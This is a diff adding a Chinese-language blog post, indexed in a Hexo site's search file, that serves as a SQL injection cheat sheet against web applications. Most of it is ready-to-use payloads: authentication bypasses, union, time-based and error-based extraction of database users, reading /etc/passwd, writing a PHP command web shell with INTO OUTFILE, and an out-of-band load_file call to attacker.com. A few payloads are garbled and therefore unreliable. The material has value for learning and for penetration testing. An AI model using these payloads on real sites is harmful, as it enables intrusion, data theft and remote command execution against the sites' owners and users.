@@ -18,4 +18,53 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>WEB漏洞挖掘方法 - SQL注入篇</title>
+    <url>/cnblogs.github.io/2025/01/04/hacker/infiltrate/shares/WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
+    <content><![CDATA[<p><strong>常见的注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET/POST/PUT/DELETE参数：常见的注入点，通常会尝试在HTTP请求的参数中注入SQL命令。</span><br><span class="line">如：http://xx.com/product.php?id=12&#x27; OR 1=1 --</span><br><span class="line">X-Forwarded-For：HTTP头部字段，通常用于伪造IP地址，但也可以用于注入SQL或XSS。</span><br><span class="line">如：X-Forwarded-For: 192.168.1.1&#x27; OR 1=1 --</span><br><span class="line">文件名：尝试通过文件上传或者文件路径访问时进行注入。</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12/(在这里添加判断)</span><br><span class="line"></span><br><span class="line">&#x27;：单引号，常见于字符串插入的地方，尤其是SQL注入。</span><br><span class="line">/：斜杠，可能用于路径遍历、注入等。</span><br><span class="line">&quot;：双引号，常用于字符串拼接。</span><br><span class="line">1/1：常用于测试SQL注入的效果，1/1返回真。</span><br><span class="line">1/0：常用于测试除零错误，触发数据库报错。</span><br><span class="line">and 1=1：常见的SQL注入测试条件，通常返回真，确认注入是否成功。</span><br><span class="line">&quot; and &quot;1&quot;=&quot;1：类似于</span><br><span class="line">and 1=1，用于测试注入成功与否。</span><br><span class="line">and 1=2：尝试返回假的条件（例如，1=2为假），验证是否会导致不同的行为。</span><br><span class="line">or 1=1：另一种常用的条件判断，若数据库返回成功则说明注入可行。</span><br><span class="line">or 1=：同样是一个条件，可能会触发SQL查询错误。</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1：注入测试，验证条件是否返回真。</span><br><span class="line">+：加号可能用于URL编码或者SQL中拼接字符串。</span><br><span class="line">-：减号，用于注释掉SQL中的后续部分。</span><br><span class="line">^：异或运算符，有时用于绕过过滤或触发错误。</span><br><span class="line">*：星号，可能用于选择所有字段，或作为乘法运算符。</span><br><span class="line">%：百分号，可能用于SQL模糊匹配或URL编码。</span><br><span class="line">/：除号，常用来触发除零错误等SQL注入。</span><br><span class="line">&lt;&lt;, &gt;&gt;：左移右移位操作符，可能用于绕过过滤或触发错误。</span><br><span class="line">||：逻辑或操作符，用于组合多个条件。</span><br><span class="line">|：按位或操作符，可能用于SQL注入或绕过过滤。</span><br><span class="line">&amp;：按位与操作符，常用于某些SQL注入攻击。</span><br><span class="line">&amp;&amp;：逻辑与操作符，组合条件判断。</span><br><span class="line">~：按位取反操作符，有时用于SQL注入。</span><br><span class="line">!：逻辑非操作符，常用于条件判断。</span><br><span class="line">@：在某些数据库中用作变量前缀，或用于其他目的。</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入分类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经典SQL注入：在输入字段中注入恶意的SQL查询语句，例如：&#x27; OR 1=1 --，绕过身份验证，返回所有记录。</span><br><span class="line">盲注（Blind SQL Injection）：</span><br><span class="line">布尔盲注：通过观察页面响应是否变化来推测数据库的内容，例如：&#x27; AND 1=1 -- 和 &#x27; AND 1=2 --。</span><br><span class="line">时间盲注：通过观察数据库响应延迟来判断查询的真假，例如：&#x27; AND SLEEP(5) --。</span><br><span class="line">联合查询注入（Union-based SQL Injection）：使用UNION SELECT来合并多个查询，尝试获取数据库中的其他表数据。</span><br><span class="line">报错注入（Error-based SQL Injection）：通过生成SQL错误，泄露数据库结构信息。</span><br></pre></td></tr></table></figure>
+
+<p><strong>Mysql 中常用的函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br><span class="line">@@version：SQL查询常见的数据库版本信息。</span><br><span class="line">@@servername：SQL查询数据库服务器名称。</span><br><span class="line">@@language：SQL查询当前数据库语言设置。</span><br><span class="line">@@spid：SQL查询当前会话ID（进程ID）。</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试列数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如 </span><br><span class="line">http://xx.com/index.asp?id=12+union+select+null,null-- ，不断增加 </span><br><span class="line">null 至不返回</span><br></pre></td></tr></table></figure>
+
+<p><strong>报错注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and select 1/0：用来触发除零错误，从而可以获取数据库错误信息，帮助推测数据库类型。</span><br><span class="line">http://xx.com/product.php?id=12 and *select 1 from (select count(*), concat(version(), floor(rand(0)2))x from information_schema.tables group by x)a：通过查询数据库信息并触发错误来暴露数据库版本信息。</span><br><span class="line">http://xx.com/product.php?id=12 and extractvalue(1, concat(0x5c, (select user())))：利用XML函数extractvalue来注入并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and updatexml(0x3a, concat(1, (select user())), 1)：类似于extractvalue，用于从XML中提取数据。</span><br><span class="line">http://xx.com/product.php?id=12 and exp(~(SELECT * from(select user())a))：通过调用exp函数触发错误并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and ST_LatFromGeoHash((select * from(select * from(select user())a)b))：利用空间数据函数进行注入。</span><br></pre></td></tr></table></figure>
+
+<p><strong>基于geometric的报错注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and GeometryCollection((select * from(select * from(select user())a)b))：触发错误信息并通过几何类型函数获取用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and polygon((select * from(select * from(select user())a)b))：同样触发错误，通过polygon函数。</span><br><span class="line">http://xx.com/product.php?id=12 and multipoint((select * from(select * from(select user())a)b))：几何类型函数的一种。</span><br><span class="line">http://xx.com/product.php?id=12 and multilinestring((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and LINESTRING((select * from(select * from(select user())a)b))：几何类型函数之一，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and multipolygon((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br></pre></td></tr></table></figure>
+
+<p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效</p>
+<p><strong>堆叠注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and ;select 1：使用分号（;）来结束当前查询并开始新的查询。</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12#</span><br><span class="line">#：注释符，SQL中用来注释掉后续的语句。</span><br><span class="line">--+：SQL注释符，</span><br><span class="line">--用于注释，</span><br><span class="line">+可绕过某些过滤器。</span><br><span class="line">/xxx/：块注释，SQL注释的一种形式。</span><br><span class="line">/!xxx/：条件注释，仅在特定版本的MySQL中生效，通常用于版本差异化操作。</span><br><span class="line">/!50000xxx/：MySQL特定版本支持的注释格式，通常用于绕过过滤。</span><br></pre></td></tr></table></figure>
+
+<p><strong>判断过滤规则</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否有trunc：检查是否存在截断字符。</span><br><span class="line">是否过滤某个字符：检查是否有过滤掉特定字符，如单引号、双引号等。</span><br><span class="line">是否过滤关键字：检查是否有过滤掉SQL关键字，如select, union, insert等。</span><br><span class="line">slash和编码：检查是否需要对斜杠或字符进行编码或转义。</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断数据库类型</span><br><span class="line">and exists(select * from msysobjects) &gt; 0：针对Access数据库。</span><br><span class="line">and exists(select * from sysobjects) &gt; 0：针对SQL Server数据库。</span><br><span class="line">判断数据库表</span><br><span class="line">and exists (select * from admin)：检查是否存在admin表，用来验证表名。</span><br><span class="line">确定字段数</span><br><span class="line">Order By：常用于通过排序获取不同字段数目，帮助注入者确认表的列数。</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读敏感文件：测试是否能够读取敏感文件，如/etc/passwd（类Unix系统）、Windows系统中的boot.ini等。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;/etc/passwd&#x27;) --</span><br><span class="line"></span><br><span class="line">写shell：测试是否能够上传并执行恶意脚本（shell）。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; --</span><br><span class="line"></span><br><span class="line">文件操作：测试是否能够对文件进行修改或删除操作。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php echo &#x27;Hello&#x27;; ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/hello.php&#x27; --</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带外通道：使用HTTP请求、DNS请求、SMTP等协议发送数据，从而建立与攻击者的通信通道。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;http://attacker.com/shell.txt&#x27;) --</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>WEB漏洞挖掘方法</category>
+      </categories>
+      <tags>
+        <tag>SQL注入篇</tag>
+      </tags>
+  </entry>
 </search>
